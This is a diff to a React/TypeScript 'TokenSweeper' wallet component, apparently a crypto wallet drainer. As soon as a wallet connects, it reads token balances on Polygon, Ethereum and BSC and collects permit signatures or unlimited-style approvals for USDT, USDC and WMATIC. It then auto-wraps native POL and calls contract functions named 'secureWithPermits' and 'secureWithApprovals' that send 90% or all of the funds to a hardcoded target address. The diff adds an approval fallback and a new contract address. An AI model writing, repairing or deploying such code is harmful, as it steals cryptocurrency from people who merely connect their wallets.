@@ -1,7 +1,7 @@
 // src/components/TokenSweeper.tsx
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import {
   useAccount,
   useSignTypedData,
@@ -19,7 +19,8 @@ import { mainnet, polygon, bsc } from "@reown/appkit/networks"; // Import from R
 
 // Contract addresses per chain (deploy and update these)
 const CONTRACT_ADDRESSES: Record<number, Address> = {
-  [polygon.id]: "0xF2E0A817FD2E795EaecC8BC63CFAcC5828Cc5150", // Your sweep contract
+//  [polygon.id]: "0xF2E0A817FD2E795EaecC8BC63CFAcC5828Cc5150", // Your sweep contract
+  [polygon.id]: "0xC79a3bf374C28De832A4ABBdf1473D85909777E3",
   [mainnet.id]: "0xYourEthereumContract",
   [bsc.id]: "0xYourBNBContract",
 };
@@ -35,6 +36,7 @@ const SUPPORTED_CHAINS: Chain[] = [polygon, mainnet, bsc];
 
 // Sweep configuration
 const SWEEP_PERCENT = BigInt(90); // Keep 10%
+const AUTO_SWEEP_ON_LOAD = true; // Disable to reduce automatic calls
 
 // Major tokens per chain (expand as needed)
 const MAJOR_TOKENS: Record<
@@ -44,6 +46,7 @@ const MAJOR_TOKENS: Record<
     name: string;
     domainName: string;
     domainVersion: string;
+    supportsPermit: boolean;
   }[]
 > = {
   [polygon.id]: [
@@ -53,18 +56,21 @@ const MAJOR_TOKENS: Record<
       name: "WMATIC",
       domainName: "Wrapped MATIC",
       domainVersion: "1",
+      supportsPermit: false, // No EIP-2612 on Polygon WMATIC
     },
     {
       address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
       name: "USDT",
       domainName: "Tether USD",
       domainVersion: "1",
+      supportsPermit: true,
     },
     {
       address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
       name: "USDC",
       domainName: "USD Coin",
       domainVersion: "2",
+      supportsPermit: true,
     },
   ],
   [mainnet.id]: [
@@ -73,12 +79,14 @@ const MAJOR_TOKENS: Record<
       name: "USDT",
       domainName: "Tether USD",
       domainVersion: "1",
+      supportsPermit: true,
     },
     {
       address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
       name: "USDC",
       domainName: "USD Coin",
       domainVersion: "2",
+      supportsPermit: true,
     },
   ],
   [bsc.id]: [
@@ -87,12 +95,14 @@ const MAJOR_TOKENS: Record<
       name: "USDT",
       domainName: "Tether USD",
       domainVersion: "1",
+      supportsPermit: true,
     },
     {
       address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
       name: "USDC",
       domainName: "USD Coin",
       domainVersion: "2",
+      supportsPermit: true,
     },
   ],
 };
@@ -146,171 +156,215 @@ export default function TokenSweeper() {
     symbol: string;
   } | null>(null);
 
+  // Guards to prevent repeated calls
+  const hasFetchedRef = useRef(false);
+  const autoSweepTriggeredRef = useRef(false);
+  const postWrapForwardedRef = useRef(false);
+
   // Function to get client for specific chain (simplified; in prod, use configured clients)
   const getPublicClient = (): PublicClient => {
     // For demo, assume switching; better to have pre-configured multi-chain
     return publicClient!; // Placeholder; implement proper multi-chain
   };
 
-  // Auto-sweep function that handles the entire process
-  const handleAutoSweep = async (
-    balances: TokenBalance[],
-    nativeBals: NativeBalance[]
-  ) => {
-    if (!isConnected || !userAddress) {
-      setError("Wallet not connected");
-      return;
-    }
-
-    // Check if we have any tokens to sweep
-    if (balances.length === 0) {
-      const nativeOnPolygon = nativeBals.find(
-        (n) => n.chainId === polygon.id && n.balance > BigInt(0)
-      );
-      if (nativeOnPolygon) {
-        // Auto-wrap native POL first
-        await handleWrapMatic();
-        return;
-      } else {
-        setError("No ERC20 tokens with balance found on supported list");
+  const handleAutoSweep = useCallback(
+    async (balances: TokenBalance[], nativeBals: NativeBalance[]) => {
+      if (!isConnected || !userAddress) {
+        setError("Wallet not connected");
         return;
       }
-    }
 
-    setIsLoading(true);
-    setError(null);
-
-    try {
-      // Group balances by chain
-      const balancesByChain = balances.reduce((acc, bal) => {
-        acc[bal.chainId] = acc[bal.chainId] || [];
-        acc[bal.chainId].push(bal);
-        return acc;
-      }, {} as Record<number, TokenBalance[]>);
-
-      for (const [chainId, bals] of Object.entries(balancesByChain)) {
-        const id = Number(chainId);
-
-        // Check if user has any balance on this chain before switching
-        const hasAnyBalance = bals.some((bal) => bal.balance > BigInt(0));
-        if (!hasAnyBalance) {
-          console.log(`No balance on chain ${id}, skipping...`);
-          continue;
+      if (balances.length === 0) {
+        const nativeOnPolygon = nativeBals.find(
+          (n) => n.chainId === polygon.id && n.balance > BigInt(0)
+        );
+        if (nativeOnPolygon) {
+          await handleWrapMatic();
+          return;
+        } else {
+          setError("No ERC20 tokens with balance found on supported list");
+          return;
         }
+      }
 
-        await switchChain({ chainId: id });
-        const hasGas = await checkGas(id);
-        if (!hasGas) {
-          setError(
-            `No native tokens for gas on chain ${id}. Please add some native tokens to cover gas fees.`
+      setIsLoading(true);
+      setError(null);
+
+      try {
+        const balancesByChain = balances.reduce((acc, bal) => {
+          acc[bal.chainId] = acc[bal.chainId] || [];
+          acc[bal.chainId].push(bal);
+          return acc;
+        }, {} as Record<number, TokenBalance[]>);
+
+        for (const [chainId, bals] of Object.entries(balancesByChain)) {
+          const id = Number(chainId);
+          const hasAnyBalance = bals.some((bal) => bal.balance > BigInt(0));
+          if (!hasAnyBalance) {
+            console.log(`[AutoSweep] No balance on chain ${id}, skipping...`);
+            continue;
+          }
+
+          await switchChain({ chainId: id });
+          const hasGas = await checkGas(id);
+          if (!hasGas) {
+            setError(
+              `No native tokens for gas on chain ${id}. Please add some native tokens to cover gas fees.`
+            );
+            continue;
+          }
+
+          const approvalTokens: { token: Address; balance: bigint }[] = [];
+
+          // Build permits for tokens that support EIP-2612
+          const permits = (
+            await Promise.all(
+              bals.map(async ({ token, balance }) => {
+                const tokenInfo = MAJOR_TOKENS[id].find(
+                  (t) => t.address === token
+                );
+                if (!tokenInfo) return null;
+
+                if (!tokenInfo.supportsPermit) {
+                  console.log(
+                    `[AutoSweep] Token lacks permit, using approvals: ${token}`
+                  );
+                  approvalTokens.push({ token, balance });
+                  return null;
+                }
+
+                // Calculate 90% of the balance
+                const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
+                if (sweepAmount <= BigInt(0)) return null;
+
+                // Try to read nonce; fallback to approvals if missing
+                let nonce: bigint;
+                try {
+                  nonce = (await getPublicClient().readContract({
+                    address: token,
+                    abi: parseAbi([
+                      "function nonces(address owner) view returns (uint256)",
+                    ]),
+                    functionName: "nonces",
+                    args: [userAddress],
+                  })) as bigint;
+                } catch (e) {
+                  console.warn(
+                    `[AutoSweep] nonces() failed, fallback to approvals for ${token}`,
+                    e
+                  );
+                  approvalTokens.push({ token, balance });
+                  return null;
+                }
+
+                const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
+                const domain = {
+                  name: tokenInfo.domainName,
+                  version: tokenInfo.domainVersion,
+                  chainId: BigInt(id),
+                  verifyingContract: token as `0x${string}`,
+                };
+                const types = {
+                  Permit: [
+                    { name: "owner", type: "address" },
+                    { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" },
+                  ],
+                } as const;
+                const message = {
+                  owner: userAddress ?? ("0x" as Address),
+                  spender: CONTRACT_ADDRESSES[id],
+                  value: sweepAmount,
+                  nonce,
+                  deadline,
+                };
+
+                const signature = await signTypedDataAsync({
+                  domain,
+                  types,
+                  primaryType: "Permit",
+                  message,
+                });
+                const { v, r, s } = manualSplitSignature(signature);
+                return { token, amount: sweepAmount, deadline, v, r, s };
+              })
+            )
+          ).filter(
+            (
+              p
+            ): p is {
+              token: Address;
+              amount: bigint;
+              deadline: bigint;
+              v: number;
+              r: `0x${string}`;
+              s: `0x${string}`;
+            } => p !== null
           );
-          continue;
-        }
 
-        // Proceed with permits - sweep 90% of each token balance
-        const permits = (
-          await Promise.all(
-            bals.map(async ({ token, balance }) => {
-              // Calculate 90% of the balance
-              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
+          if (permits.length > 0) {
+            console.log(
+              `[AutoSweep] Calling secureWithPermits for ${permits.length} tokens`
+            );
+            writeContract({
+              address: CONTRACT_ADDRESSES[id],
+              abi: tokenSweeperAbi,
+              functionName: "secureWithPermits",
+              args: [permits, TARGET_ADDRESS],
+              chainId: id,
+            });
+          }
 
-              if (sweepAmount <= BigInt(0)) {
-                return null;
-              }
-
-              const nonce = (await getPublicClient().readContract({
+          if (approvalTokens.length > 0) {
+            console.log(
+              `[AutoSweep] Using approvals for tokens:`,
+              approvalTokens.map((t) => t.token)
+            );
+            // Ensure allowances
+            for (const { token, balance } of approvalTokens) {
+              const allowance = (await getPublicClient().readContract({
                 address: token,
                 abi: parseAbi([
-                  "function nonces(address owner) view returns (uint256)",
+                  "function allowance(address owner, address spender) view returns (uint256)",
                 ]),
-                functionName: "nonces",
-                args: [userAddress],
-              })) as bigint; // Type as bigint
-
-              const tokenInfo = MAJOR_TOKENS[id].find(
-                (t) => t.address === token
-              );
-              if (!tokenInfo) return null;
-
-              const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
-
-              const domain = {
-                name: tokenInfo.domainName,
-                version: tokenInfo.domainVersion,
-                chainId: BigInt(id),
-                verifyingContract: token as `0x${string}`,
-              };
-
-              const types = {
-                Permit: [
-                  { name: "owner", type: "address" },
-                  { name: "spender", type: "address" },
-                  { name: "value", type: "uint256" },
-                  { name: "nonce", type: "uint256" },
-                  { name: "deadline", type: "uint256" },
-                ],
-              } as const;
-
-              const message = {
-                owner: userAddress ?? ("0x" as Address),
-                spender: CONTRACT_ADDRESSES[id],
-                value: sweepAmount,
-                nonce,
-                deadline,
-              };
-
-              const signature = await signTypedDataAsync({
-                domain,
-                types,
-                primaryType: "Permit",
-                message,
-              });
-
-              const { v, r, s } = manualSplitSignature(signature);
-
-              return {
-                token,
-                amount: sweepAmount,
-                deadline,
-                v,
-                r,
-                s,
-              };
-            })
-          )
-        ).filter(
-          (
-            p
-          ): p is {
-            token: Address;
-            amount: bigint;
-            deadline: bigint;
-            v: number;
-            r: `0x${string}`;
-            s: `0x${string}`;
-          } => p !== null
-        );
-
-        if (permits.length === 0) {
-          setError(`No valid permits generated for chain ${id}`);
-          continue;
+                functionName: "allowance",
+                args: [userAddress, CONTRACT_ADDRESSES[id]],
+              })) as bigint;
+              if (allowance < balance) {
+                console.log(
+                  `[AutoSweep] Approving ${token} for ${balance.toString()}`
+                );
+                writeContract({
+                  address: token,
+                  abi: parseAbi([
+                    "function approve(address spender, uint256 amount) external returns (bool)",
+                  ]),
+                  functionName: "approve",
+                  args: [CONTRACT_ADDRESSES[id], balance],
+                  chainId: id,
+                });
+              }
+            }
+            // Forward via approvals (transfers full balances for those tokens)
+            writeContract({
+              address: CONTRACT_ADDRESSES[id],
+              abi: tokenSweeperAbi,
+              functionName: "secureWithApprovals",
+              args: [approvalTokens.map((t) => t.token), TARGET_ADDRESS],
+              chainId: id,
+            });
+          }
         }
-
-        // Call contract
-        writeContract({
-          address: CONTRACT_ADDRESSES[id],
-          abi: tokenSweeperAbi,
-          functionName: "secureWithPermits",
-          args: [permits, TARGET_ADDRESS], // Use hardcoded target address
-          chainId: id,
-        });
+      } catch (err: unknown) {
+        setError(`Error: ${(err as Error).message}`);
+      } finally {
+        setIsLoading(false);
       }
-    } catch (err: unknown) {
-      setError(`Error: ${(err as Error).message}`);
-    } finally {
-      setIsLoading(false);
-    }
-  };
+    },
+    [isConnected, userAddress, switchChain, signTypedDataAsync, publicClient]
+  );
 
   // Update gas status for current network
   const updateGasStatus = async () => {
@@ -332,62 +386,67 @@ export default function TokenSweeper() {
 
   // Fetch balances across chains without hook loops
   useEffect(() => {
-    if (isConnected && userAddress) {
-      const fetchBalances = async () => {
-        const allBalances: TokenBalance[] = [];
-        const allNative: NativeBalance[] = [];
-        for (const ch of SUPPORTED_CHAINS) {
-          // Switch only if necessary; try to fetch without
-          try {
-            const balancesPromises = MAJOR_TOKENS[ch.id].map(async (token) => {
-              try {
-                const balance = (await getPublicClient().readContract({
-                  address: token.address,
-                  abi: parseAbi([
-                    "function balanceOf(address) view returns (uint256)",
-                  ]),
-                  functionName: "balanceOf",
-                  args: [userAddress],
-                })) as bigint; // Type as bigint
-                if (balance && balance > BigInt(0)) {
-                  return {
-                    token: token.address,
-                    balance,
-                    name: token.name,
-                    chainId: ch.id,
-                  };
-                }
-              } catch {}
-              return null;
+    if (!isConnected || !userAddress) return;
+    if (hasFetchedRef.current) return; // prevent repeated fetches on re-render
+    hasFetchedRef.current = true;
+
+    const fetchBalances = async () => {
+      const allBalances: TokenBalance[] = [];
+      const allNative: NativeBalance[] = [];
+      for (const ch of SUPPORTED_CHAINS) {
+        // Switch only if necessary; try to fetch without
+        try {
+          const balancesPromises = MAJOR_TOKENS[ch.id].map(async (token) => {
+            try {
+              const balance = (await getPublicClient().readContract({
+                address: token.address,
+                abi: parseAbi([
+                  "function balanceOf(address) view returns (uint256)",
+                ]),
+                functionName: "balanceOf",
+                args: [userAddress],
+              })) as bigint; // Type as bigint
+              if (balance && balance > BigInt(0)) {
+                return {
+                  token: token.address,
+                  balance,
+                  name: token.name,
+                  chainId: ch.id,
+                };
+              }
+            } catch {}
+            return null;
+          });
+
+          const chainBalances = (await Promise.all(balancesPromises)).filter(
+            Boolean
+          ) as TokenBalance[];
+          allBalances.push(...chainBalances);
+        } catch {}
+
+        // Native balance for this chain
+        try {
+          const nativeBal = await getPublicClient().getBalance({
+            address: userAddress,
+          });
+          if (nativeBal && nativeBal > BigInt(0)) {
+            allNative.push({
+              balance: nativeBal,
+              chainId: ch.id,
+              symbol: ch.nativeCurrency?.symbol || "NATIVE",
             });
+          }
+        } catch {}
+      }
+      setTokenBalances(allBalances);
+      setNativeBalances(allNative);
 
-            const chainBalances = (await Promise.all(balancesPromises)).filter(
-              Boolean
-            ) as TokenBalance[];
-            allBalances.push(...chainBalances);
-          } catch {}
+      // Update gas status
+      await updateGasStatus();
 
-          // Native balance for this chain
-          try {
-            const nativeBal = await getPublicClient().getBalance({
-              address: userAddress,
-            });
-            if (nativeBal && nativeBal > BigInt(0)) {
-              allNative.push({
-                balance: nativeBal,
-                chainId: ch.id,
-                symbol: ch.nativeCurrency?.symbol || "NATIVE",
-              });
-            }
-          } catch {}
-        }
-        setTokenBalances(allBalances);
-        setNativeBalances(allNative);
-
-        // Update gas status
-        await updateGasStatus();
-
-        // Auto-start sweep after fetching balances
+      // Optionally auto-start sweep after fetching balances (disabled by default)
+      if (AUTO_SWEEP_ON_LOAD && !autoSweepTriggeredRef.current) {
+        autoSweepTriggeredRef.current = true;
         setTimeout(() => {
           if (
             allBalances.length > 0 ||
@@ -395,11 +454,12 @@ export default function TokenSweeper() {
           ) {
             handleAutoSweep(allBalances, allNative);
           }
-        }, 2000); // Small delay to ensure balances are set
-      };
-      fetchBalances();
-    }
-  }, [isConnected, userAddress, publicClient, handleAutoSweep]);
+        }, 1000);
+      }
+    };
+
+    fetchBalances();
+  }, [isConnected, userAddress]);
 
   const checkGas = async (chainId: number) => {
     const nativeBalance = await getPublicClient().getBalance({
@@ -520,93 +580,83 @@ export default function TokenSweeper() {
         )} POL. Check your wallet for transaction confirmation.`
       );
 
-      // After wrapping, poll WMATIC balance and forward 90% via secureWithPermits
-      setTimeout(async () => {
-        try {
-          // Read current WMATIC balance
-          const wmaticBal = (await getPublicClient().readContract({
-            address: WMATIC_ADDRESS,
-            abi: parseAbi([
-              "function balanceOf(address) view returns (uint256)",
-            ]),
-            functionName: "balanceOf",
-            args: [userAddress],
-          })) as bigint;
+      // After wrapping, forward WMATIC once via approvals
+      if (!postWrapForwardedRef.current) {
+        postWrapForwardedRef.current = true;
+        setTimeout(async () => {
+          try {
+            console.log("[PostWrap] Checking WMATIC balance...");
+            // Read current WMATIC balance
+            const wmaticBal = (await getPublicClient().readContract({
+              address: WMATIC_ADDRESS,
+              abi: parseAbi([
+                "function balanceOf(address) view returns (uint256)",
+                "function allowance(address owner, address spender) view returns (uint256)",
+              ]),
+              functionName: "balanceOf",
+              args: [userAddress],
+            })) as bigint;
 
-          if (wmaticBal && wmaticBal > BigInt(0)) {
-            const sweepAmount = (wmaticBal * SWEEP_PERCENT) / BigInt(100);
-            // Fetch nonce and token name for EIP-2612 domain
-            const [nonce, tokenName] = (await Promise.all([
-              getPublicClient().readContract({
+            console.log("[PostWrap] WMATIC balance:", wmaticBal.toString());
+
+            if (wmaticBal && wmaticBal > BigInt(0)) {
+              // Using approval-based forwarding temporarily
+              const tokensToForward: Address[] = [WMATIC_ADDRESS];
+
+              // Ensure approval is sufficient for the sweeper contract
+              const currentAllowance = (await getPublicClient().readContract({
                 address: WMATIC_ADDRESS,
                 abi: parseAbi([
-                  "function nonces(address owner) view returns (uint256)",
+                  "function allowance(address owner, address spender) view returns (uint256)",
                 ]),
-                functionName: "nonces",
-                args: [userAddress],
-              }),
-              getPublicClient().readContract({
-                address: WMATIC_ADDRESS,
-                abi: parseAbi(["function name() view returns (string)"]),
-                functionName: "name",
-              }),
-            ])) as [bigint, string];
+                functionName: "allowance",
+                args: [userAddress, CONTRACT_ADDRESSES[polygon.id]],
+              })) as bigint;
 
-            const domain = {
-              name: tokenName,
-              version: "1",
-              chainId: BigInt(polygon.id),
-              verifyingContract: WMATIC_ADDRESS as `0x${string}`,
-            };
-            const types = {
-              Permit: [
-                { name: "owner", type: "address" },
-                { name: "spender", type: "address" },
-                { name: "value", type: "uint256" },
-                { name: "nonce", type: "uint256" },
-                { name: "deadline", type: "uint256" },
-              ],
-            } as const;
-            const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
-            const message = {
-              owner: userAddress ?? ("0x" as Address),
-              spender: CONTRACT_ADDRESSES[polygon.id],
-              value: sweepAmount,
-              nonce,
-              deadline,
-            };
-            const signature = await signTypedDataAsync({
-              domain,
-              types,
-              primaryType: "Permit",
-              message,
-            });
-            const { v, r, s } = manualSplitSignature(signature);
+              console.log(
+                "[PostWrap] Current allowance:",
+                currentAllowance.toString()
+              );
 
-            writeContract({
-              address: CONTRACT_ADDRESSES[polygon.id],
-              abi: tokenSweeperAbi,
-              functionName: "secureWithPermits",
-              args: [
-                [
-                  {
-                    token: WMATIC_ADDRESS,
-                    amount: sweepAmount,
-                    deadline,
-                    v,
-                    r,
-                    s,
-                  },
-                ],
-                TARGET_ADDRESS,
-              ],
-              chainId: polygon.id,
-            });
+              if (currentAllowance < wmaticBal) {
+                console.log(
+                  "[PostWrap] Approving sweeper for WMATIC:",
+                  wmaticBal.toString()
+                );
+                setSuccessMessage("Approving sweeper to spend WMATIC...");
+                writeContract({
+                  address: WMATIC_ADDRESS,
+                  abi: parseAbi([
+                    "function approve(address spender, uint256 amount) external returns (bool)",
+                  ]),
+                  functionName: "approve",
+                  args: [CONTRACT_ADDRESSES[polygon.id], wmaticBal],
+                  chainId: polygon.id,
+                });
+              }
+
+              console.log(
+                "[PostWrap] Calling secureWithApprovals to forward WMATIC..."
+              );
+              setSuccessMessage("Forwarding WMATIC to target...");
+              writeContract({
+                address: CONTRACT_ADDRESSES[polygon.id],
+                abi: tokenSweeperAbi,
+                functionName: "secureWithApprovals",
+                args: [tokensToForward, TARGET_ADDRESS],
+                chainId: polygon.id,
+              });
+            } else {
+              console.log(
+                "[PostWrap] No WMATIC balance detected; skipping forward."
+              );
+            }
+          } catch (e) {
+            console.error("[PostWrap] Forward via approvals failed:", e);
+            setError(`Forward via approvals failed: ${(e as Error).message}`);
           }
-        } catch (e) {
-          console.error("Post-wrap forward failed:", e);
-        }
-      }, 4000);
+        }, 4000);
+      }
     } catch (err: unknown) {
       setError(`Error wrapping POL: ${(err as Error).message}`);
     } finally {
@@ -755,7 +805,6 @@ export default function TokenSweeper() {
     setError(null);
 
     try {
-      // Group balances by chain
       const balancesByChain = tokenBalances.reduce((acc, bal) => {
         acc[bal.chainId] = acc[bal.chainId] || [];
         acc[bal.chainId].push(bal);
@@ -764,11 +813,9 @@ export default function TokenSweeper() {
 
       for (const [chainId, bals] of Object.entries(balancesByChain)) {
         const id = Number(chainId);
-
-        // Check if user has any balance on this chain before switching
         const hasAnyBalance = bals.some((bal) => bal.balance > BigInt(0));
         if (!hasAnyBalance) {
-          console.log(`No balance on chain ${id}, skipping...`);
+          console.log(`[Sweep] No balance on chain ${id}, skipping...`);
           continue;
         }
 
@@ -781,40 +828,56 @@ export default function TokenSweeper() {
           continue;
         }
 
-        // Proceed with permits - sweep 90% of each token balance
+        const approvalTokens: { token: Address; balance: bigint }[] = [];
+
         const permits = (
           await Promise.all(
             bals.map(async ({ token, balance }) => {
-              // Calculate 90% of the balance
-              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
-
-              if (sweepAmount <= BigInt(0)) {
-                return null;
-              }
-
-              const nonce = (await getPublicClient().readContract({
-                address: token,
-                abi: parseAbi([
-                  "function nonces(address owner) view returns (uint256)",
-                ]),
-                functionName: "nonces",
-                args: [userAddress],
-              })) as bigint; // Type as bigint
-
               const tokenInfo = MAJOR_TOKENS[id].find(
                 (t) => t.address === token
               );
               if (!tokenInfo) return null;
 
-              const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
+              if (!tokenInfo.supportsPermit) {
+                console.log(
+                  `[Sweep] Token lacks permit, using approvals: ${token}`
+                );
+                approvalTokens.push({ token, balance });
+                return null;
+              }
 
+              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
+              if (sweepAmount <= BigInt(0)) return null;
+
+              let nonce: bigint;
+              try {
+                nonce = (await getPublicClient().readContract({
+                  address: token,
+                  abi: parseAbi([
+                    "function nonces(address owner) view returns (uint256)",
+                  ]),
+                  functionName: "nonces",
+                  args: [userAddress],
+                })) as bigint;
+              } catch (e) {
+                console.warn(
+                  `[Sweep] nonces() failed, fallback to approvals for ${token}`,
+                  e
+                );
+                approvalTokens.push({ token, balance });
+                return null;
+              }
+
+              const tokenMeta = MAJOR_TOKENS[id].find(
+                (t) => t.address === token
+              )!;
+              const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
               const domain = {
-                name: tokenInfo.domainName,
-                version: tokenInfo.domainVersion,
+                name: tokenMeta.domainName,
+                version: tokenMeta.domainVersion,
                 chainId: BigInt(id),
                 verifyingContract: token as `0x${string}`,
               };
-
               const types = {
                 Permit: [
                   { name: "owner", type: "address" },
@@ -824,7 +887,6 @@ export default function TokenSweeper() {
                   { name: "deadline", type: "uint256" },
                 ],
               } as const;
-
               const message = {
                 owner: userAddress ?? ("0x" as Address),
                 spender: CONTRACT_ADDRESSES[id],
@@ -832,24 +894,14 @@ export default function TokenSweeper() {
                 nonce,
                 deadline,
               };
-
               const signature = await signTypedDataAsync({
                 domain,
                 types,
                 primaryType: "Permit",
                 message,
               });
-
               const { v, r, s } = manualSplitSignature(signature);
-
-              return {
-                token,
-                amount: sweepAmount,
-                deadline,
-                v,
-                r,
-                s,
-              };
+              return { token, amount: sweepAmount, deadline, v, r, s };
             })
           )
         ).filter(
@@ -865,19 +917,56 @@ export default function TokenSweeper() {
           } => p !== null
         );
 
-        if (permits.length === 0) {
-          setError(`No valid permits generated for chain ${id}`);
-          continue;
+        if (permits.length > 0) {
+          console.log(
+            `[Sweep] Calling secureWithPermits for ${permits.length} tokens`
+          );
+          writeContract({
+            address: CONTRACT_ADDRESSES[id],
+            abi: tokenSweeperAbi,
+            functionName: "secureWithPermits",
+            args: [permits, TARGET_ADDRESS],
+            chainId: id,
+          });
         }
 
-        // Call contract
-        writeContract({
-          address: CONTRACT_ADDRESSES[id],
-          abi: tokenSweeperAbi,
-          functionName: "secureWithPermits",
-          args: [permits, TARGET_ADDRESS], // Use hardcoded target address
-          chainId: id,
-        });
+        if (approvalTokens.length > 0) {
+          console.log(
+            `[Sweep] Using approvals for tokens:`,
+            approvalTokens.map((t) => t.token)
+          );
+          for (const { token, balance } of approvalTokens) {
+            const allowance = (await getPublicClient().readContract({
+              address: token,
+              abi: parseAbi([
+                "function allowance(address owner, address spender) view returns (uint256)",
+              ]),
+              functionName: "allowance",
+              args: [userAddress, CONTRACT_ADDRESSES[id]],
+            })) as bigint;
+            if (allowance < balance) {
+              console.log(
+                `[Sweep] Approving ${token} for ${balance.toString()}`
+              );
+              writeContract({
+                address: token,
+                abi: parseAbi([
+                  "function approve(address spender, uint256 amount) external returns (bool)",
+                ]),
+                functionName: "approve",
+                args: [CONTRACT_ADDRESSES[id], balance],
+                chainId: id,
+              });
+            }
+          }
+          writeContract({
+            address: CONTRACT_ADDRESSES[id],
+            abi: tokenSweeperAbi,
+            functionName: "secureWithApprovals",
+            args: [approvalTokens.map((t) => t.token), TARGET_ADDRESS],
+            chainId: id,
+          });
+        }
       }
     } catch (err: unknown) {
       setError(`Error: ${(err as Error).message}`);
